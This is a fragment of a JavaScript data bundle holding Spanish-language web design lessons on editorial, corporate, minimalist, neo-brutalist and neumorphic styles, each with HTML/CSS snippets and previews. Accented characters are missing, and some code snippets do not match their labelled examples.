`,completed:!1},{id:"visual-arch-2-1-clasica-editorial",title:"2.1 Esttica Clsica Editorial",level:"junior",content:`# 2.1 Esttica Clsica Editorial

Esta esttica busca replicar la autoridad y sofisticacin del papel impreso (Vogue, NYT).

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Letra Capital (Drop Cap)
Un clsico editorial que marca el inicio de una historia con fuerza visual.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="max-width:300px; color:#fff; font-family:serif; line-height:1.6;">
    <span style="font-size:3.5rem; float:left; line-height:1; margin-right:0.5rem; color:#10b981; font-weight:900;">L</span>a arquitectura visual no es solo el arte de lo bello, sino la ciencia de lo legible y lo funcional.
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
p::first-letter {
  font-family: serif;
  font-size: 3.5rem;
  float: left;
  line-height: 1;
  margin-right: 0.5rem;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Drop Cap</summary>
<div class="preview-box">
<div style="max-width:300px; color:#fff; font-family:serif; line-height:1.6;">
    <span style="font-size:3.5rem; float:left; line-height:1; margin-right:0.5rem; color:#10b981; font-weight:900;">L</span>a arquitectura visual no es solo el arte de lo bello, sino la ciencia de lo legible y lo funcional.
  </div>
</div>
</details>

### Ejemplo 2: Bordes y Separadores Elegantes
El uso de lneas finas crea una organizacin impecable sin saturar.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="width:100%; max-width:400px; text-align:center; font-family:serif;">
    <div style="border-top: 1px solid #10b981; border-bottom: 3px double #10b981; padding: 1rem 0; color:#fff; font-size:1.2rem; text-transform:uppercase; letter-spacing:0.2em;">The Gazette</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.divider {
  border-top: 1px solid #fff;
  border-bottom: 2px solid #fff;
  padding: 0.5rem 0;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Editorial Divider</summary>
<div class="preview-box">
<div style="width:100%; max-width:400px; text-align:center; font-family:serif;">
    <div style="border-top: 1px solid #10b981; border-bottom: 3px double #10b981; padding: 1rem 0; color:#fff; font-size:1.2rem; text-transform:uppercase; letter-spacing:0.2em;">The Gazette</div>
  </div>
</div>
</details>

### Ejemplo 3: Layout de Columnas (Newspaper Style)
Distribucin tipo diario para contenido denso.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="column-count: 2; column-gap: 1rem; color: #888; font-size: 0.8rem; font-family: serif; text-align: justify; max-width: 400px;">
    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam nec augue ut erat scelerisque hendrerit. Nulla facilisi. Sed sit amet lacus metus. In hac habitasse platea dictumst. Quisque facilisis massa sed purus pellentesque.
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.newspaper { column-count: 2; column-gap: 2rem; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Columnas</summary>
<div class="preview-box">
<div style="column-count: 2; column-gap: 1rem; color: #888; font-size: 0.8rem; font-family: serif; text-align: justify; max-width: 400px;">
    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam nec augue ut erat scelerisque hendrerit. Nulla facilisi. Sed sit amet lacus metus. In hac habitasse platea dictumst. Quisque facilisis massa sed purus pellentesque.
  </div>
</div>
</details>

### Ejemplo 4: Capitalizacin "Small Caps"
El uso de maysculas pequeas para subttulos o etiquetas, dando un aire de libro de arte.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="font-family:serif; color:#fff; text-align:center;">
    <div style="font-variant: small-caps; letter-spacing: 2px; font-size: 1.2rem; opacity:0.6;">Volume IV</div>
    <div style="font-size: 2.5rem; font-weight: 900; margin-top:5px;">ARCHIVE</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  font-family:serif;
  color:#fff;
  text-align:center;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Small Caps</summary>
<div class="preview-box">
<div style="font-family:serif; color:#fff; text-align:center;">
    <div style="font-variant: small-caps; letter-spacing: 2px; font-size: 1.2rem; opacity:0.6;">Volume IV</div>
    <div style="font-size: 2.5rem; font-weight: 900; margin-top:5px;">ARCHIVE</div>
  </div>
</div>
</details>

### Ejemplo 5: Citas Destacadas (Pull Quotes)
Romper el flujo del texto con una cita de gran tamao descentrada.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="max-width:300px; border-left: 2px solid #10b981; padding-left: 2rem; font-family:serif; font-style:italic; font-size:1.5rem; color:#fff; line-height:1.4;">
    "El diseo es el embajador silencioso de tu marca."
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  max-width:300px;
  border-left: 2px solid #10b981;
  padding-left: 2rem;
  font-family:serif;
  font-style:italic;
  font-size:1.5rem;
  color:#fff;
  line-height:1.4;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Pull Quote</summary>
<div class="preview-box">
<div style="max-width:300px; border-left: 2px solid #10b981; padding-left: 2rem; font-family:serif; font-style:italic; font-size:1.5rem; color:#fff; line-height:1.4;">
    "El diseo es el embajador silencioso de tu marca."
  </div>
</div>
</details>

`,completed:!1},{id:"visual-arch-2-2-corporativa-tradicional",title:"2.2 Esttica Corporativa Tradicional",level:"junior",content:`# 2.2 Esttica Corporativa Tradicional

Confianza, escala y profesionalismo rgido (IBM, Microsoft B2B).

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Cards Corporativas (Business Look)
Bordes pequeos, sombras sutiles y alineacin estricta.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="background:#fff; border:1px solid #d1d5db; border-radius:4px; padding:2rem; width:280px; font-family:sans-serif; box-shadow:0 1px 3px rgba(0,0,0,0.1);">
     <div style="width:30px; height:30px; background:#1e40af; border-radius:4px; margin-bottom:1rem;"></div>
     <div style="font-weight:700; color:#111; margin-bottom:0.5rem;">Reporte Mensual</div>
     <div style="font-size:0.85rem; color:#666;">Analiza el rendimiento de tus activos con precisin empresarial.</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.corp-card {
  border: 1px solid #ddd;
  border-radius: 4px;
  background: white;
  padding: 1.5rem;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Corp Card</summary>
<div class="preview-box">
<div style="background:#fff; border:1px solid #d1d5db; border-radius:4px; padding:2rem; width:280px; font-family:sans-serif; box-shadow:0 1px 3px rgba(0,0,0,0.1);">
     <div style="width:30px; height:30px; background:#1e40af; border-radius:4px; margin-bottom:1rem;"></div>
     <div style="font-weight:700; color:#111; margin-bottom:0.5rem;">Reporte Mensual</div>
     <div style="font-size:0.85rem; color:#666;">Analiza el rendimiento de tus activos con precisin empresarial.</div>
  </div>
</div>
</details>

### Ejemplo 2: Data Tables Limpias
Presentacin de informacin financiera o tcnica sin ruido visual.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<table style="width:100%; border-collapse:collapse; background: white; border-radius: 8px; overflow: hidden; font-family: sans-serif; font-size: 0.8rem;">
    <tr style="background:#f9fafb; color:#111;">
      <th style="padding:10px; border-bottom:1px solid #eee;">Proyecto</th>
      <th style="padding:10px; border-bottom:1px solid #eee;">Estatus</th>
    </tr>
    <tr>
      <td style="padding:10px; border-bottom:1px solid #eee; color:#333;">Core v2.1</td>
      <td style="padding:10px; border-bottom:1px solid #eee;"><span style="color:#10b981; font-weight:bold;">Completado</span></td>
    </tr>
  </table>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
th { background: #f3f4f6; color: #374151; padding: 0.75rem; text-align: left; }
td { border-bottom: 1px solid #e5e7eb; padding: 0.75rem; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Clean Table</summary>
<div class="preview-box">
<table style="width:100%; border-collapse:collapse; background: white; border-radius: 8px; overflow: hidden; font-family: sans-serif; font-size: 0.8rem;">
    <tr style="background:#f9fafb; color:#111;">
      <th style="padding:10px; border-bottom:1px solid #eee;">Proyecto</th>
      <th style="padding:10px; border-bottom:1px solid #eee;">Estatus</th>
    </tr>
    <tr>
      <td style="padding:10px; border-bottom:1px solid #eee; color:#333;">Core v2.1</td>
      <td style="padding:10px; border-bottom:1px solid #eee;"><span style="color:#10b981; font-weight:bold;">Completado</span></td>
    </tr>
  </table>
</div>
</details>

### Ejemplo 3: Botones de Accin Seguros
Colores slidos, contrastes altos y bordes predecibles.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<button style="background:#1e40af; color:white; border:none; border-radius:4px; padding:12px 24px; font-weight:bold; font-family:sans-serif; cursor:pointer;">CONFIRMAR ACCIN</button>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.btn-corp { background: #1e40af; color: #fff; padding: 0.75rem 1.5rem; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Corp Button</summary>
<div class="preview-box">
<button style="background:#1e40af; color:white; border:none; border-radius:4px; padding:12px 24px; font-weight:bold; font-family:sans-serif; cursor:pointer;">CONFIRMAR ACCIN</button>
</div>
</details>

### Ejemplo 4: Status Badges Corporativos
Etiquetas de estado que transmiten orden y control de procesos.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display:flex; gap:10px; font-family:sans-serif;">
    <div style="background:#dcfce7; color:#166534; padding:4px 12px; border-radius:999px; font-size:0.75rem; font-weight:bold;">VERIFICADO</div>
    <div style="background:#f3f4f6; color:#374151; padding:4px 12px; border-radius:999px; font-size:0.75rem; font-weight:bold;">PENDIENTE</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  display:flex;
  gap:10px;
  font-family:sans-serif;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Business Status</summary>
<div class="preview-box">
<div style="display:flex; gap:10px; font-family:sans-serif;">
    <div style="background:#dcfce7; color:#166534; padding:4px 12px; border-radius:999px; font-size:0.75rem; font-weight:bold;">VERIFICADO</div>
    <div style="background:#f3f4f6; color:#374151; padding:4px 12px; border-radius:999px; font-size:0.75rem; font-weight:bold;">PENDIENTE</div>
  </div>
</div>
</details>

### Ejemplo 2: Stepper Vertical
Gua de pasos para procesos complejos, comn en software B2B.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="font-family:sans-serif; color:#fff;">
    <div style="display:flex; gap:15px; align-items:center;">
      <div style="width:24px; height:24px; background:#1e40af; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:10px; font-weight:bold;">1</div>
      <div style="font-size:0.9rem; font-weight:bold;">Validacin ID</div>
    </div>
    <div style="width:2px; height:20px; background:#333; margin-left:11px;"></div>
    <div style="display:flex; gap:15px; align-items:center; opacity:0.4;">
      <div style="width:24px; height:24px; background:#333; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:10px; font-weight:bold;">2</div>
      <div style="font-size:0.9rem; font-weight:bold;">Firma Digital</div>
    </div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  font-family:sans-serif;
  color:#fff;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Stepper</summary>
<div class="preview-box">
<div style="font-family:sans-serif; color:#fff;">
    <div style="display:flex; gap:15px; align-items:center;">
      <div style="width:24px; height:24px; background:#1e40af; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:10px; font-weight:bold;">1</div>
      <div style="font-size:0.9rem; font-weight:bold;">Validacin ID</div>
    </div>
    <div style="width:2px; height:20px; background:#333; margin-left:11px;"></div>
    <div style="display:flex; gap:15px; align-items:center; opacity:0.4;">
      <div style="width:24px; height:24px; background:#333; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:10px; font-weight:bold;">2</div>
      <div style="font-size:0.9rem; font-weight:bold;">Firma Digital</div>
    </div>
  </div>
</div>
</details>

`,completed:!1},{id:"visual-arch-2-3-minimalismo-clasico",title:"2.3 Minimalismo Clsico",level:"junior",content:`# 2.3 Minimalismo Clsico

"Menos es ms". El poder del espacio en blanco y la tipografa pura.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: El Header Fantasma
Navegacin que desaparece para dar protagonismo al contenido.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="width:100%; display:flex; justify-content:space-between; align-items:center; font-family:sans-serif; color:white;">
    <div style="font-weight:900; letter-spacing:-1px;">MNML.</div>
    <div style="display:flex; gap:20px; font-size:0.8rem; letter-spacing:2px; opacity:0.7;">
      <span>HOME</span>
      <span>WORK</span>
    </div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.header-minimal { background: transparent; padding: 2rem 0; border: none; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Header Minimal</summary>
<div class="preview-box">
<div style="width:100%; display:flex; justify-content:space-between; align-items:center; font-family:sans-serif; color:white;">
    <div style="font-weight:900; letter-spacing:-1px;">MNML.</div>
    <div style="display:flex; gap:20px; font-size:0.8rem; letter-spacing:2px; opacity:0.7;">
      <span>HOME</span>
      <span>WORK</span>
    </div>
  </div>
</div>
</details>

### Ejemplo 2: Prrafo en Aire
Mucho interlineado y margen para facilitar la reflexin.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="max-width:300px; text-align:center; color:#fff; font-family:sans-serif; line-height:2.5; letter-spacing:0.2em; opacity:0.8; font-size:0.9rem;">
    EL SILENCIO VISUAL ES EL GRITO MS FUERTE.
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.text-air { line-height: 2; letter-spacing: 0.05em; padding: 4rem; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Text Air</summary>
<div class="preview-box">
<div style="max-width:300px; text-align:center; color:#fff; font-family:sans-serif; line-height:2.5; letter-spacing:0.2em; opacity:0.8; font-size:0.9rem;">
    EL SILENCIO VISUAL ES EL GRITO MS FUERTE.
  </div>
</div>
</details>

### Ejemplo 3: Botn de Contorno (Ghost Button)
Una accin que no compite visualmente con el contenido de la pgina.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<button style="background:transparent; border:1px solid #fff; color:white; padding:10px 30px; font-family:sans-serif; font-size:0.7rem; letter-spacing:3px; cursor:pointer;">EXPLORAR</button>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.btn-ghost { background: transparent; border: 1px solid #fff; color: #fff; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Ghost Button</summary>
<div class="preview-box">
<button style="background:transparent; border:1px solid #fff; color:white; padding:10px 30px; font-family:sans-serif; font-size:0.7rem; letter-spacing:3px; cursor:pointer;">EXPLORAR</button>
</div>
</details>

### Ejemplo 4: Borde de Color nico
El uso de un solo color de acento sobre un lienzo blanco/negro total.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="border: 1px solid #10b981; padding:2rem 4rem; color:#10b981; font-family:sans-serif; font-weight:100; font-size:2rem; letter-spacing:10px;">CORE</div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  border: 1px solid #10b981;
  padding:2rem 4rem;
  color:#10b981;
  font-family:sans-serif;
  font-weight:100;
  font-size:2rem;
  letter-spacing:10px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Monocolor Border</summary>
<div class="preview-box">
<div style="border: 1px solid #10b981; padding:2rem 4rem; color:#10b981; font-family:sans-serif; font-weight:100; font-size:2rem; letter-spacing:10px;">CORE</div>
</div>
</details>

### Ejemplo 5: Texto de Fondo Suave
Usar texto gigante con muy baja opacidad como textura de fondo.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="background:#fff; border-radius:24px; padding:3rem; width:260px; box-shadow: 0 4px 6px rgba(0,0,0,0.02), 0 30px 60px rgba(0,0,0,0.12);">
    <div style="width:40px; height:40px; background:linear-gradient(to bottom right, #10b981, #3b82f6); border-radius:12px; margin-bottom:1.5rem;"></div>
    <div style="color:#111; font-weight:800; font-family:sans-serif; font-size:1.2rem;">Modern SaaS</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  position:relative;
  overflow:hidden;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Background Text</summary>
<div class="preview-box" style="position:relative; overflow:hidden;">
  <div style="position:absolute; font-size:10rem; font-weight:900; color:rgba(255,255,255,0.03); left:-20px; top:0; pointer-events:none; font-family:sans-serif;">ZERO</div>
  <div style="position:relative; z-index:2; color:#fff; font-family:sans-serif; text-align:center;">
    <div style="font-size:1.5rem; font-weight:100;">Nothing is</div>
    <div style="font-size:1.5rem; font-weight:900;">Everything</div>
  </div>
</div>
</details>

`,completed:!1},{id:"visual-arch-3-1-minimalismo-moderno",title:"3.1 Minimalismo Moderno (Clean UI)",level:"junior",content:`# 3.1 Minimalismo Moderno

Profundidad sutil, bordes suaves y microinteracciones (Stripe, Linear, Apple).

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Sombras Multinivel (Depth)
Crear sensacin de elevacin natural usando sombras apiladas.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.modern-card {
  box-shadow: 0 4px 6px rgba(0,0,0,0.02), 0 20px 40px rgba(0,0,0,0.08);
  border-radius: 20px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Modern Depth</summary>
<div class="preview-box">
<div style="background:#fff; border-radius:24px; padding:3rem; width:260px; box-shadow: 0 4px 6px rgba(0,0,0,0.02), 0 30px 60px rgba(0,0,0,0.12);">
    <div style="width:40px; height:40px; background:linear-gradient(to bottom right, #10b981, #3b82f6); border-radius:12px; margin-bottom:1.5rem;"></div>
    <div style="color:#111; font-weight:800; font-family:sans-serif; font-size:1.2rem;">Modern SaaS</div>
  </div>
</div>
</details>

### Ejemplo 2: Border Gradient Sutil
Un borde que no es slido, sino un degradado fino para un look premium.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="padding: 2.5rem; background:#111; border-radius:16px; position:relative; overflow:hidden;">
     <div style="position:absolute; inset:0; border:1px solid rgba(255,255,255,0.1); border-radius:16px; pointer-events:none; border:1px solid; border-image: linear-gradient(45deg, #10b981, transparent) 1;"></div>
     <div style="color:#fff; font-family:sans-serif; font-weight:bold;">Borde Proyectado</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.premium-border {
  border: 1px solid transparent;
  background-image: linear-gradient(white, white), radial-gradient(circle at top left, #10b981, #3b82f6);
  background-origin: border-box;
  background-clip: padding-box, border-box;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Premium Border</summary>
<div class="preview-box">
<div style="padding: 2.5rem; background:#111; border-radius:16px; position:relative; overflow:hidden;">
     <div style="position:absolute; inset:0; border:1px solid rgba(255,255,255,0.1); border-radius:16px; pointer-events:none; border:1px solid; border-image: linear-gradient(45deg, #10b981, transparent) 1;"></div>
     <div style="color:#fff; font-family:sans-serif; font-weight:bold;">Borde Proyectado</div>
  </div>
</div>
</details>

### Ejemplo 3: Icono con Fondo de Opacidad Baja
Combinacin clsica de color fuerte en icono sobre fondo 10% opacidad.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display:flex; align-items:center; gap:15px; font-family:sans-serif;">
    <div style="width:50px; height:50px; border-radius:12px; background:rgba(16, 185, 129, 0.1); display:flex; align-items:center; justify-content:center; color:#10b981; font-size:1.5rem;"></div>
    <div style="color:white; font-weight:bold;">Tarea Completada</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.icon-wrap { background: rgba(16, 185, 129, 0.1); color: #10b981; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Soft Icon</summary>
<div class="preview-box">
<div style="display:flex; align-items:center; gap:15px; font-family:sans-serif;">
    <div style="width:50px; height:50px; border-radius:12px; background:rgba(16, 185, 129, 0.1); display:flex; align-items:center; justify-content:center; color:#10b981; font-size:1.5rem;"></div>
    <div style="color:white; font-weight:bold;">Tarea Completada</div>
  </div>
</div>
</details>

### Ejemplo 4: Tarjeta de Vidrio Esmerilado (Glass-card)
Un clsico del minimalismo moderno para dar profundidad.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<button style="background:#fff; color:#000; border:none; padding:12px 30px; border-radius:100px; font-weight:bold; cursor:pointer; transition:0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);" onmouseover="this.style.transform='scale(1.1)'" onmouseout="this.style.transform='scale(1)'">EXPLORE NOW</button>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  background:linear-gradient(135deg, #1e3a8a, #0f172a);
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Modern Glass</summary>
<div class="preview-box" style="background:linear-gradient(135deg, #1e3a8a, #0f172a);">
  <div style="background:rgba(255,255,255,0.05); backdrop-filter:blur(10px); -webkit-backdrop-filter:blur(10px); padding:2rem; border-radius:24px; border:1px solid rgba(255,255,255,0.1); width:200px; color:#fff; font-family:sans-serif;">
    <div style="font-size:1.5rem; font-weight:900; margin-bottom:0.5rem;">$24,000</div>
    <div style="font-size:0.7rem; opacity:0.6;">NET PROFIT</div>
  </div>
</div>
</details>

### Ejemplo 5: Micro-interaccin de Botn (Scale)
Efecto de presin suave al hacer hover.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:#fff;
  color:#000;
  border:none;
  padding:12px 30px;
  border-radius:100px;
  font-weight:bold;
  cursor:pointer;
  transition:0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Hover Interaction</summary>
<div class="preview-box">
<button style="background:#fff; color:#000; border:none; padding:12px 30px; border-radius:100px; font-weight:bold; cursor:pointer; transition:0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);" onmouseover="this.style.transform='scale(1.1)'" onmouseout="this.style.transform='scale(1)'">EXPLORE NOW</button>
</div>
</details>

`,completed:!1},{id:"visual-arch-3-2-brutalismo-web",title:"3.2 Brutalismo Web y Neo-Brutalismo",level:"junior",content:`# 3.2 Brutalismo Web y Neo-Brutalismo

Antidiseo, bordes negros, sombras slidas y colores pop.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: El Botn Sticker (Neo-Brutalism)
Una sombra dura y negra que no tiene blur.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<button style="background:#fbbf24; color:#000; border:3px solid #000; box-shadow:6px 6px 0 #000; padding:15px 35px; font-weight:900; font-family:sans-serif; cursor:pointer; text-transform:uppercase; letter-spacing:1px;">COMIENZA YA</button>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.neo-btn {
  background: #facc15;
  border: 3px solid #000;
  box-shadow: 5px 5px 0 #000;
  font-weight: 900;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Neo Button</summary>
<div class="preview-box">
<button style="background:#fbbf24; color:#000; border:3px solid #000; box-shadow:6px 6px 0 #000; padding:15px 35px; font-weight:900; font-family:sans-serif; cursor:pointer; text-transform:uppercase; letter-spacing:1px;">COMIENZA YA</button>
</div>
</details>

### Ejemplo 2: Cards "Pop"
Superficies planas con contrastes agresivos.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="background:#fff; border:4px solid #000; box-shadow:12px 12px 0 #10b981; padding:2rem; width:220px; font-family:sans-serif; font-weight:bold; color:#000;">
    Contenido Directo. Sin adornos.
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.neo-card {
  background: #fff;
  border: 4px solid #000;
  box-shadow: 10px 10px 0 #facc15;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Neo Card</summary>
<div class="preview-box">
<div style="background:#fff; border:4px solid #000; box-shadow:12px 12px 0 #10b981; padding:2rem; width:220px; font-family:sans-serif; font-weight:bold; color:#000;">
    Contenido Directo. Sin adornos.
  </div>
</div>
</details>

### Ejemplo 3: Hover Neo-Brutalista
Un efecto que mueve el elemento hacia su propia sombra.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<button style="background:#ec4899; color:#000; border:3px solid #000; box-shadow:6px 6px 0 #000; padding:15px 35px; font-weight:900; font-family:sans-serif; cursor:pointer; transition: 0.1s;" onmousedown="this.style.transform='translate(4px, 4px)'; this.style.boxShadow='0 0 0 #000'" onmouseup="this.style.transform='translate(0, 0)'; this.style.boxShadow='6px 6px 0 #000'" onmouseleave="this.style.transform='translate(0, 0)'; this.style.boxShadow='6px 6px 0 #000'">
    PRESIONAME
  </button>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.neo-btn:hover { transform: translate(4px, 4px); box-shadow: 0 0 0 #000; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Neo Hover</summary>
<div class="preview-box">
<button style="background:#ec4899; color:#000; border:3px solid #000; box-shadow:6px 6px 0 #000; padding:15px 35px; font-weight:900; font-family:sans-serif; cursor:pointer; transition: 0.1s;" onmousedown="this.style.transform='translate(4px, 4px)'; this.style.boxShadow='0 0 0 #000'" onmouseup="this.style.transform='translate(0, 0)'; this.style.boxShadow='6px 6px 0 #000'" onmouseleave="this.style.transform='translate(0, 0)'; this.style.boxShadow='6px 6px 0 #000'">
    PRESIONAME
  </button>
</div>
</details>

### Ejemplo 4: El Layout "Raw"
Uso de tipografas monoespaciadas y bordes sin redondez para un look "en construccin".


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="border:2px solid white; padding:2rem; font-family:monospace; color:white;">
    <div style="background:white; color:black; padding:5px; margin-bottom:1rem; font-weight:bold;">CRITICAL_LOG_01</div>
    <div>> Initializing system...</div>
    <div>> Accessing database...</div>
    <div>> OK.</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  border:2px solid white;
  padding:2rem;
  font-family:monospace;
  color:white;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Raw Layout</summary>
<div class="preview-box">
<div style="border:2px solid white; padding:2rem; font-family:monospace; color:white;">
    <div style="background:white; color:black; padding:5px; margin-bottom:1rem; font-weight:bold;">CRITICAL_LOG_01</div>
    <div>> Initializing system...</div>
    <div>> Accessing database...</div>
    <div>> OK.</div>
  </div>
</div>
</details>

### Ejemplo 5: Colores de Seguridad
Uso de verde nen o amarillo sobre fondo negro para mxima visibilidad.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="background:#e0e0e0; padding:3rem; border-radius:40px; box-shadow: 15px 15px 30px #bebebe, -15px -15px 30px #ffffff; color:#666; font-weight:bold; font-family:sans-serif;">
    SOFT
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  background:#000;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: High Contrast Pop</summary>
<div class="preview-box" style="background:#000;">
  <div style="color:#0f0; font-family:sans-serif; font-weight:900; font-size:3rem; border:10px solid #0f0; padding:1rem; transform:rotate(-2deg);">ALERT</div>
</div>
</details>

`,completed:!1},{id:"visual-arch-3-3-neumorphism",title:"3.3 Neumorphism (Soft UI)",level:"junior",content:`# 3.3 Neumorphism (Soft UI)

Esculpiendo el material con luz y sombra.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: El Panel Extruido
Combinacin de sombras positiva y negativa del mismo color que el fondo.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.soft-extrude {
  box-shadow: 20px 20px 60px #bebebe, -20px -20px 60px #ffffff;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Soft Panel</summary>
<div class="preview-box">
<div style="background:#e0e0e0; padding:3rem; border-radius:40px; box-shadow: 15px 15px 30px #bebebe, -15px -15px 30px #ffffff; color:#666; font-weight:bold; font-family:sans-serif;">
    SOFT
  </div>
</div>
</details>

